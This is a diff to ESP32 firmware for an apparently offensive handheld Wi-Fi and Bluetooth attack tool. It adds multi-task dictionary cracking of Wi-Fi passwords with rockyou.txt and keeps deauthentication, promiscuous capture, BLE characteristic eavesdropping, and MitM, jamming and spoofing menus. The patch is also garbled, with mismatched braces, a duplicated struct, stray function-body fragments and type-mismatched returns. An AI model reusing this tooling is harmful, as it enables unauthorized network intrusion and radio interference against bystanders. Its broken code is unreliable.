@@ -1,7 +1,7 @@
 #include <Arduino.h>
 #include <TFT_eSPI.h>
 #include <WiFi.h>
-#include <SD.h>
+#include <SD_MMC.h>
 #include <ArduinoJson.h>
 #include <WiFiManager.h>
 #include <TaskScheduler.h>
@@ -15,11 +15,21 @@
 #include <BLEServer.h>
 #include <ESPAsyncWebServer.h>
 #include <ArduinoOTA.h>
+#include <Extensions/Touch.h>
+#include <XPT2046_Touchscreen.h>
 
 #define ROCKYOU_PATH "/rockyou.txt"
 #define SETTINGS_PATH "/settings.json"
 #define CHECKPOINT_PATH "/checkpoint.txt"
 #define IMAGE_PATH "/mrcb3.jpeg"
+
+#define TOUCH_CS 15
+#define TOUCH_IRQ 22
+XPT2046_Touchscreen ts(TOUCH_CS, TOUCH_IRQ);
+
+const std::string bleDeviceName = "ESP32_BLE_Device";
+const std::string SERVICE_UUID = "12345678-1234-1234-1234-1234567890ab";
+const std::string CHARACTERISTIC_UUID = "87654321-4321-4321-4321-0987654321ba";
 
 TFT_eSPI tft = TFT_eSPI();
 
@@ -30,9 +40,20 @@ struct NetworkInfo {
   int channel;
   bool has_password;
   String password;
-  String encryption; // e.g., WPA2, WPA3
-  String encryptionType; // e.g., AES, TKIP
-  String vendor; // e.g., Cisco, Netgear
+  String encryption;
+  String encryptionType;
+  String vendor;
+};
+
+struct CrackThreadArgs {
+  File rockyouFile;
+  String ssid;
+  String bssid;
+  long fileSize;
+  std::atomic_long *bytesRead;
+  std::atomic_bool *foundPassword;
+  String *password;
+  std::mutex *progressMutex;
 };
 
 std::vector<NetworkInfo> networks;
@@ -90,6 +111,50 @@ void sendDeauthPackets(const String &bssid, int count, bool broadcast = false);
 void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type);
 void showIntroAnimation();
 void processTouch();
+void crackThreadTask(void *args);
+void crackThreadTask(void *args) {
+  CrackThreadArgs *crackArgs = (CrackThreadArgs *)args;
+  File rockyouFile = crackArgs->rockyouFile;
+  String ssid = crackArgs->ssid;
+  String bssid = crackArgs->bssid;
+  long fileSize = crackArgs->fileSize;
+  std::atomic_long *bytesRead = crackArgs->bytesRead;
+  std::atomic_bool *foundPassword = crackArgs->foundPassword;
+  String *password = crackArgs->password;
+  std::mutex *progressMutex = crackArgs->progressMutex;
+
+  while (rockyouFile.available() && !foundPassword->load()) {
+    String line = rockyouFile.readStringUntil('\n');
+    bytesRead->fetch_add(line.length() + 1);
+    line.trim();
+
+    if (tryPassword(ssid, bssid, line)) {
+      *password = line;
+      foundPassword->store(true);
+      break;
+    }
+  }
+
+  int progress = (int)((bytesRead->load() / (float)fileSize) * 100);
+  {
+    std::lock_guard<std::mutex> lock(*progressMutex);
+    tft.fillRect(0, 50, 320, 20, TFT_BLACK);
+    tft.setCursor(0, 50);
+    tft.printf("Progress: %d%%", progress);
+  }
+
+  delay(5);
+
+  uint16_t rawX, rawY;
+  if (tft.getTouch(&rawX, &rawY)) {
+    tft.println("User interrupted the process.");
+    break;
+  }
+
+  // End this task
+  vTaskDelete(NULL);
+}
+
 void showImage(const char *filename, bool fillScreen);
 void jpegRender(int xpos, int ypos, int widthLimit, int heightLimit);
 void drawBackgroundImage();
@@ -121,7 +186,11 @@ class EavesdropCallback : public BLEAdvertisedDeviceCallbacks {
 
       BLERemoteService* pRemoteService = pClient->getService(advertisedDevice.getServiceUUID());
       if (pRemoteService != nullptr) {
-        std::vector<BLERemoteCharacteristic*> characteristics = pRemoteService->getCharacteristics();
+        std::map<std::string, BLERemoteCharacteristic*>* characteristicMap = pRemoteService->getCharacteristics();
+        std::vector<BLERemoteCharacteristic*> characteristics;
+        for (const auto& [key, value] : *characteristicMap) {
+            characteristics.push_back(value);
+        }
         for (auto& characteristic : characteristics) {
           if (characteristic->canRead()) {
             std::string value = characteristic->readValue();
@@ -215,12 +284,12 @@ void showIntroAnimation() {
   delay(3000);
 }
 
+// Function to display an image from SD card and optionally fill the screen
 void showImage(const char *filename, bool fillScreen) {
-    if (!SD.begin()) {
-        tft.println("SD Card initialization failed.");
-        return;
-    }
-}
+  if (!SD.begin()) {
+    tft.println("SD Card initialization failed.");
+    return;
+  }
 
   File jpgFile = SD.open(filename);
   if (!jpgFile) {
@@ -368,48 +437,6 @@ void handleHandshakes() {
 void handleSAEHandshakes() {
   tft.println("Attempting to capture SAE handshakes for WPA3.");
   saeHandshakes.clear();
-
-  setPromiscuousMode(true);
-
-  esp_wifi_set_promiscuous_rx_cb([](void *buf, wifi_promiscuous_pkt_type_t type) {
-    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
-    uint8_t *payload = pkt->payload;
-    int headerLength = pkt->rx_ctrl.sig_len;
-    int payloadLen = headerLength;
-
-    if (payloadLen > 0 && payload[0] == 0xB0) {
-      // Extract SAE handshake frames
-      std::vector<uint8_t> handshake(payload, payload + headerLength + payloadLen);
-      saeHandshakes.push_back(handshake);
-      tft.println("SAE handshake frame captured.");
-    }
-  });
-
-  delay(10000);
-
-  setPromiscuousMode(false);
-  tft.println("SAE handshake capture completed.");
-
-  if (saeHandshakes.empty()) {
-    tft.println("No SAE handshakes captured.");
-  } else {
-    tft.println("SAE handshakes captured.");
-    // Save SAE handshakes to SD card
-    File file = SD.open("/sae_handshakes.bin", FILE_WRITE);
-    for (const auto &handshake : saeHandshakes) {
-      file.write(handshake.data(), handshake.size());
-    }
-    file.close();
-  }
-}
-
-void fillDeauthPacket(const String &bssid, bool broadcast) {
-  for (int i = 0; i < 6; ++i) {
-    deauthPacket[10 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
-    deauthPacket[16 + i] = broadcast ? 0xFF : strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
-  }
-}
-
 String crackPassword(const String &ssid, const String &bssid) {
   File rockyouFile = SD.open(ROCKYOU_PATH, FILE_READ);
   if (!rockyouFile) {
@@ -435,65 +462,28 @@ String crackPassword(const String &ssid, const String &bssid) {
   rockyouFile.seek(checkpoint);
 
   int numThreads = 4; // Number of threads
-  pthread_t threads[numThreads];
+  TaskHandle_t taskHandles[numThreads];
   struct CrackThreadArgs {
-    File rockyouFile;
-    String ssid;
-    String bssid;
-    long fileSize;
-    std::atomic_long *bytesRead;
-    std::atomic_bool *foundPassword;
-    String *password;
-    std::mutex *progressMutex;
-  };
-
-  auto crackThread = [](void *args) -> void * {
-    CrackThreadArgs *crackArgs = (CrackThreadArgs *)args;
-    File rockyouFile = crackArgs->rockyouFile;
-    String ssid = crackArgs->ssid;
-    String bssid = crackArgs->bssid;
-    long fileSize = crackArgs->fileSize;
-    std::atomic_long *bytesRead = crackArgs->bytesRead;
-    std::atomic_bool *foundPassword = crackArgs->foundPassword;
-    String *password = crackArgs->password;
-    std::mutex *progressMutex = crackArgs->progressMutex;
-
-    while (rockyouFile.available() && !foundPassword->load()) {
-      String line = rockyouFile.readStringUntil('\n');
-      bytesRead->fetch_add(line.length() + 1);
-      line.trim();
-      if (tryPassword(ssid, bssid, line)) {
-        *password = line;
-        foundPassword->store(true);
-        break;
-      }
-
-      int progress = (int)((bytesRead->load() / (float)fileSize) * 100);
-      {
-        std::lock_guard<std::mutex> lock(*progressMutex);
-        tft.fillRect(0, 50, 320, 20, TFT_BLACK);
-        tft.setCursor(0, 50);
-        tft.printf("Progress: %d%%", progress);
-      }
-
-      delay(5);
-
-      uint16_t touchX, touchY;
-      if (tft.getTouch(&touchX, &touchY)) {
-        tft.println("User interrupted the process.");
-        break;
-      }
-    }
-    return NULL;
-  };
-
+  File rockyouFile;
+  String ssid;
+  String bssid;
+  long fileSize;
+  std::atomic_long *bytesRead;
+  std::atomic_bool *foundPassword;
+  String *password;
+  std::mutex *progressMutex;
+};
+  // Set up arguments and create tasks
   CrackThreadArgs args = {rockyouFile, ssid, bssid, fileSize, &bytesRead, &foundPassword, &password, &progressMutex};
   for (int i = 0; i < numThreads; ++i) {
-    pthread_create(&threads[i], NULL, crackThread, &args);
+    xTaskCreatePinnedToCore(crackThreadTask, "CrackTask", 4096, &args, 1, &taskHandles[i], 1);
   }
 
+  // Wait for all tasks to complete
   for (int i = 0; i < numThreads; ++i) {
-    pthread_join(threads[i], NULL);
+    if (taskHandles[i] != NULL) {
+      vTaskDelete(taskHandles[i]);
+    }
   }
 
   checkpointFile = SD.open(CHECKPOINT_PATH, FILE_WRITE);
@@ -505,9 +495,48 @@ String crackPassword(const String &ssid, const String &bssid) {
   rockyouFile.close();
   return password;
 }
+    int progress = (int)((bytesRead->load() / (float)fileSize) * 100);
+    {
+      std::lock_guard<std::mutex> lock(*progressMutex);
+      tft.fillRect(0, 50, 320, 20, TFT_BLACK);
+      tft.setCursor(0, 50);
+      tft.printf("Progress: %d%%", progress);
+    }
 
-bool tryPassword(const String &ssid, const String &bssid, const String &password) {
-  Serial.printf("Trying password: %s for SSID: %s\n", password.c_str(), ssid.c_str());
+    delay(5);
+
+    uint16_t rawX, rawY;
+    if (tft.getTouch(&rawX, &rawY)) {
+      tft.println("User interrupted the process.");
+      break;
+    }
+  }
+
+  // End this task
+  vTaskDelete(NULL);
+}
+
+// Set up arguments and create tasks
+CrackThreadArgs args = {rockyouFile, ssid, bssid, fileSize, &bytesRead, &foundPassword, &password, &progressMutex};
+for (int i = 0; i < numThreads; ++i) {
+  xTaskCreatePinnedToCore(crackThreadTask, "CrackTask", 4096, &args, 1, &taskHandles[i], 1);
+}
+
+// Wait for all tasks to complete
+for (int i = 0; i < numThreads; ++i) {
+  if (taskHandles[i] != NULL) {
+    vTaskDelete(taskHandles[i]);
+  }
+}
+
+checkpointFile = SD.open(CHECKPOINT_PATH, FILE_WRITE);
+if (checkpointFile) {
+  checkpointFile.println(bytesRead.load());
+  checkpointFile.close();
+}
+
+rockyouFile.close();
+return password;
 
   WiFi.disconnect();
   delay(100);
@@ -524,10 +553,10 @@ bool tryPassword(const String &ssid, const String &bssid, const String &password
   if (isConnected) {
     Serial.println("Connected!");
     WiFi.disconnect();
-    return true;
+    return password;
   } else {
     Serial.println("Failed to connect.");
-    return false;
+    return "";
   }
 }
 
@@ -542,62 +571,6 @@ void displayNetworkInfo(const NetworkInfo &network) {
   tft.printf("Encryption: %s\n", network.encryption.c_str());
   tft.printf("Encryption Type: %s\n", network.encryptionType.c_str());
   tft.printf("Vendor: %s\n", network.vendor.c_str());
-  tft.printf("Has Password: %s\n", network.has_password ? "Yes" : "No");
-  if (network.has_password) {
-    tft.printf("Password: %s\n", network.password.isEmpty() ? "Not cracked" : network.password.c_str());
-  }
-}
-
-void loadNetworksFromSD() {
-  File file = SD.open("/networks.json", FILE_READ);
-  if (!file) {
-    Serial.println("Failed to open networks.json.");
-    tft.println("No networks to select.");
-    return;
-  }
-  
-  DynamicJsonDocument doc(2048);
-  DeserializationError error = deserializeJson(doc, file);
-  if (error) {
-    Serial.println("Failed to parse JSON.");
-    tft.println("Failed to parse JSON.");
-    file.close();
-    return;
-  }
-  
-  networks.clear();
-  for (JsonObject network : doc["networks"].as<JsonArray>()) {
-    NetworkInfo net;
-    net.ssid = network["ssid"].as<String>();
-    net.bssid = network["bssid"].as<String>();
-    net.rssi = network["rssi"];
-    net.channel = network["channel"];
-    net.has_password = network["has_password"];
-    net.password = network["password"].as<String>();
-    net.encryption = network["encryption"].as<String>();
-    net.encryptionType = network["encryptionType"].as<String>();
-    net.vendor = network["vendor"].as<String>();
-    networks.push_back(net);
-  }
-  file.close();
-}
-
-void saveNetworksToSD() {
-  DynamicJsonDocument doc(2048);
-  JsonArray networkArray = doc.createNestedArray("networks");
-  
-  for (const NetworkInfo &network : networks) {
-    JsonObject net = networkArray.createNestedObject();
-    net["ssid"] = network.ssid;
-    net["bssid"] = network.bssid;
-    net["rssi"] = network.rssi;
-    net["channel"] = network.channel;
-    net["has_password"] = network.has_password;
-    net["password"] = network.password;
-    net["encryption"] = network.encryption;
-    net["encryptionType"] = network.encryptionType;
-    net["vendor"] = network.vendor;
-  }
 
   File file = SD.open("/networks.json", FILE_WRITE);
   if (!file) {
@@ -644,6 +617,10 @@ void setupFirmware() {
   tscheduler.startNow();
 
   setupBLE();
+
+  // Initialize touchscreen
+  ts.begin();
+  ts.setRotation(1);  // Adjust rotation as needed (0-3)
 }
 
 void displayMenu() {
@@ -690,19 +667,22 @@ void adjustBrightness() {
   tft.fillRect(50, 100, 220, 30, TFT_WHITE);
   tft.fillRect(50 + brightness, 100, 10, 30, TFT_BLACK);
 
-  while (true) {
-    uint16_t touchX, touchY;
-    if (tft.getTouch(&touchX, &touchY)) {
-      if (touchX > 50 && touchX < 270 && touchY > 100 && touchY < 130) {
-        brightness = touchX - 50;
+ while (true) { 
+    uint16_t rawX, rawY;
+    if (ts.touched()) {
+      TS_Point p = ts.getPoint();
+      rawX = p.x;
+      rawY = p.y;
+      // Use raw touch coordinates for touch detection
+      if (rawX > 50 && rawX < 270 && rawY > 100 && rawY < 130) {
+        brightness = rawX - 50;
         tft.fillRect(50, 100, 220, 30, TFT_WHITE);
         tft.fillRect(50 + brightness, 100, 10, 30, TFT_BLACK);
         ledcWrite(7, brightness); // Adjust backlight brightness using PWM
-      } else if (touchX > 10 && touchY > 10 && touchY < 40) {
+      } else if (rawX > 10 && rawY > 10 && rawY < 40) {
         break; // Exit loop on touch outside the slider area
       }
     }
-  }
 }
 
 void togglePromiscuousMode() {
@@ -735,10 +715,13 @@ void selectNetwork() {
     tft.printf("%d. %s\n", i + 1, networks[i].ssid.c_str());
   }
 
-  while (true) {
-    uint16_t touchX, touchY;
-    if (tft.getTouch(&touchX, &touchY)) {
-      int selectedIndex = touchY / 40; // Adjust this based on your text size and screen layout
+ while (true) {
+    uint16_t rawX, rawY;
+    if (ts.touched()) {
+      TS_Point p = ts.getPoint();
+      rawX = p.x;
+      rawY = p.y;
+      int selectedIndex = rawY / 40; // Adjust this based on your text size and screen layout
       if (selectedIndex >= 0 && selectedIndex < networks.size()) {
         selectedNetwork = networks[selectedIndex];
         displayNetworkInfo(selectedNetwork);
@@ -746,7 +729,6 @@ void selectNetwork() {
         break;
       }
     }
-  }
 }
 
 void showEncryptionInfo() {
@@ -891,19 +873,47 @@ void performNetworkScan() {
   tft.println("Scan complete.");
 }
 
-void setupBLE() {
-  BLEDevice::init(bleDeviceName.c_str());
-  pServer = BLEDevice::createServer();
-  pServer->setCallbacks(new ServerCallbacks());
+// 2. Define the ServerCallbacks class to handle BLE server events
+class ServerCallbacks : public BLEServerCallbacks {
+  void onConnect(BLEServer* pServer) override {
+    Serial.println("Device connected");
+  }
 
+  void onDisconnect(BLEServer* pServer) override {
+    Serial.println("Device disconnected");
+  }
+};
+
+// 3. Define the BLEWriteCallback class to handle write events on characteristics
+class BLEWriteCallback : public BLECharacteristicCallbacks {
+  void onWrite(BLECharacteristic* pCharacteristic) override {
+    std::string value = pCharacteristic->getValue();
+    Serial.printf("Received value: %s\n", value.c_str());
+  }
+};
+
+// 4. Define the setupBLE function with corrected identifiers and types
+void setupBLE() {
+  // Initialize the BLE device with the specified name
+  BLEDevice::init(bleDeviceName.c_str());
+  
+  // Create and configure the BLE server
+  pServer = BLEDevice::createServer();
+  pServer->setCallbacks(new ServerCallbacks());  // Assign the ServerCallbacks class
+
+  // Create a BLE service with the specified UUID
   BLEService* pService = pServer->createService(BLEUUID(SERVICE_UUID));
+  
+  // Create a characteristic with read and write properties
   pCharacteristic = pService->createCharacteristic(
-      BLEUUID(CHARACTERISTIC_UUID),
-      BLECharacteristic::PROPERTY_READ |
-      BLECharacteristic::PROPERTY_WRITE
+      BLEUUID(CHARACTERISTIC_UUID),  // Specify the characteristic UUID
+      BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE
   );
 
+  // Assign the BLEWriteCallback class to handle characteristic write events
   pCharacteristic->setCallbacks(new BLEWriteCallback());
+  
+  // Start the service and begin advertising
   pService->start();
   pServer->getAdvertising()->start();
 }
@@ -1034,58 +1044,62 @@ void displayBluetoothSecurityMenu() {
   tft.print("Bluetooth Spoofing");
 }
 
-void processBluetoothTouch() {
-  uint16_t x, y;
-  if (tft.getTouch(&x, &y)) {
-    if (x > 10 && x < 210) {
-      if (y > 40 && y < 80) {
-        animateButton(10, 40, 200, 40, true);
-        deployEavesdropping();
-        animateButton(10, 40, 200, 40, false);
-      } else if (y > 90 && y < 130) {
-        animateButton(10, 90, 200, 40, true);
-        deployMitMAttack();
-        animateButton(10, 90, 200, 40, false);
-      } else if (y > 140 && y < 180) {
-        animateButton(10, 140, 200, 40, true);
-        deployBluetoothJamming();
-        animateButton(10, 140, 200, 40, false);
-      } else if (y > 190 && y < 230) {
-        animateButton(10, 190, 200, 40, true);
-        deployBluetoothSpoofing();
-        animateButton(10, 190, 200, 40, false);
-      }
-    }
-  }
+void displayMitMMenu() {
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextSize(2);
+  tft.setTextColor(TFT_WHITE);
+
+  animateButton(10, 40, 200, 40, false);
+  tft.setCursor(20, 50);
+  tft.print("Start MitM Attack");
+
+  animateButton(10, 90, 200, 40, false);
+  tft.setCursor(20, 100);
+  tft.print("Stop MitM Attack");
 }
 
-void setup() {
-  Serial.begin(115200);
-  setupFirmware();
+void displayEavesdroppingMenu() {
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextSize(2);
+  tft.setTextColor(TFT_WHITE);
+
+  animateButton(10, 40, 200, 40, false);
+  tft.setCursor(20, 50);
+  tft.print("Start Eavesdropping");
+
+  animateButton(10, 90, 200, 40, false);
+  tft.setCursor(20, 100);
+  tft.print("Stop Eavesdropping");
 }
 
-void loop() {
-  tscheduler.execute();
-  processTouch();
+void displayJammingMenu() {
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextSize(2);
+  tft.setTextColor(TFT_WHITE);
+
+  animateButton(10, 40, 200, 40, false);
+  tft.setCursor(20, 50);
+  tft.print("Start Jamming");
+
+  animateButton(10, 90, 200, 40, false);
+  tft.setCursor(20, 100);
+  tft.print("Stop Jamming");
 }
 
-void processTouch() {
-  uint16_t touchX, touchY;
-  if (tft.getTouch(&touchX, &touchY)) {
-    if (touchY < 40) {
-      displayMenu();
-    } else if (touchY < 80) {
-      showScrollBar();
-    } else if (touchY < 120) {
-      displaySettingsMenu();
-    } else if (touchY < 160) {
-      adjustBrightness();
-    } else if (touchY < 200) {
-      resetNetworkSettings();
-    } else if (touchY < 240) {
-      displayBluetoothSecurityMenu();
-    } else {
-      enterDeepSleep();
-    }
-  }
+void displaySpoofingMenu() {
+  tft.fillScreen(TFT_BLACK);
+  tft.setCursor(0, 0);
+  tft.setTextSize(2);
+  tft.setTextColor(TFT_WHITE);
+
+  animateButton(10, 40, 200, 40, false);
+  tft.setCursor(20, 50);
+  tft.print("Start Spoofing");
+
+  animateButton(10, 90, 200, 40, false);
+  tft.setCursor(20, 100);
+  tft.print("Stop Spoofing");
 }
